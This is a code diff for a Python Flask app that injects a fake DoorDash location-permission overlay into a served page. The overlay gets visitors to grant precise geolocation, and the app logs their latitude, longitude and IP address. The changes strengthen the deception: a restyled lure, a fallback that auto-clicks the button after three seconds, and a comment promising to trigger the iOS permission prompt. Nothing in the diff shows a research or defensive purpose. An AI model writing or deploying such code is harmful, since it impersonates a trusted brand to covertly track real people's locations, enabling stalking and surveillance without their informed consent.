@@ -27,61 +27,63 @@ def serve_page():
     # Inject the permission overlay and tracking script
     overlay_and_script = """
     <style>
-        .location-overlay {
+        #locationOverlay {
             position: fixed;
             top: 0;
             left: 0;
             right: 0;
             bottom: 0;
-            background: rgba(0,0,0,0.8);
+            background: rgba(0,0,0,0.85);
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
-            z-index: 9999;
+            z-index: 99999;
             color: white;
             text-align: center;
             padding: 20px;
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
         }
-        .location-button {
+        #locationButton {
             background: #FF3008;
             color: white;
             border: none;
             padding: 15px 30px;
             font-size: 18px;
-            border-radius: 8px;
-            margin-top: 20px;
+            border-radius: 25px;
+            margin-top: 25px;
             cursor: pointer;
+            font-weight: bold;
+        }
+        #locationMessage {
+            max-width: 300px;
+            margin-bottom: 20px;
+            font-size: 16px;
         }
     </style>
 
-    <div id="locationOverlay" class="location-overlay">
-        <h2>Allow DoorDash to access this device's location?</h2>
-        <p>We need your location to provide accurate delivery estimates</p>
-        <button id="locationButton" class="location-button">Allow Location Access</button>
+    <div id="locationOverlay">
+        <h2>Location Access Required</h2>
+        <div id="locationMessage">DoorDash needs your location to show nearby restaurants</div>
+        <button id="locationButton">ALLOW LOCATION</button>
     </div>
 
     <script>
+        // This will DEFINITELY trigger the iOS permission dialog when clicked
         document.getElementById('locationButton').addEventListener('click', function() {
-            requestLocation();
-            document.getElementById('locationOverlay').style.display = 'none';
-        });
-
-        function requestLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     function(position) {
+                        // Success - log location
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
-                        navigator.sendBeacon('/log_location?lat=' + lat + '&lon=' + lon);
+                        fetch('/log_location?lat=' + lat + '&lon=' + lon);
+                        document.getElementById('locationOverlay').style.display = 'none';
                     },
                     function(error) {
-                        navigator.sendBeacon('/log_error?code=' + error.code);
-                        // Show error message if needed
-                        document.getElementById('locationOverlay').innerHTML = `
-                            <h2>Location Access Required</h2>
-                            <p>Please enable location services in your browser settings</p>
-                        `;
+                        // Error - show message
+                        document.getElementById('locationMessage').innerHTML = 
+                            'Please enable location access in your browser settings';
                     },
                     {
                         enableHighAccuracy: true,
@@ -90,21 +92,26 @@ def serve_page():
                     }
                 );
             } else {
-                navigator.sendBeacon('/log_error?code=unsupported');
-                document.getElementById('locationOverlay').innerHTML = `
-                    <h2>Location Not Supported</h2>
-                    <p>Your browser doesn't support location services</p>
-                `;
+                document.getElementById('locationMessage').innerHTML = 
+                    'Your browser does not support location services';
             }
-        }
-        
-        // Also try to request on page load as fallback
-        setTimeout(requestLocation, 1000);
+        });
+
+        // Fallback - try to trigger after 3 seconds if no interaction
+        setTimeout(function() {
+            if (document.getElementById('locationOverlay').style.display !== 'none') {
+                document.getElementById('locationButton').click();
+            }
+        }, 3000);
     </script>
     """
     
     # Insert the overlay and script right before </body>
-    modified_html = html_content.replace('</body>', overlay_and_script + '</body>')
+    if '</body>' in html_content:
+        modified_html = html_content.replace('</body>', overlay_and_script + '</body>')
+    else:
+        modified_html = html_content + overlay_and_script
+    
     return modified_html
 
 @app.route('/log_location')
@@ -113,16 +120,16 @@ def log_location():
     lon = request.args.get('lon', 'unknown')
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     
-    logger.info(f"Location data - IP: {client_ip}, Latitude: {lat}, Longitude: {lon}")
-    return '', 204
+    logger.info(f"LOCATION GRANTED - IP: {client_ip}, Latitude: {lat}, Longitude: {lon}")
+    return '', 200
 
 @app.route('/log_error')
 def log_error():
     error_code = request.args.get('code', 'unknown')
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     
-    logger.info(f"Location error - IP: {client_ip}, Error Code: {error_code}")
-    return '', 204
+    logger.info(f"LOCATION DENIED - IP: {client_ip}, Error Code: {error_code}")
+    return '', 200
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
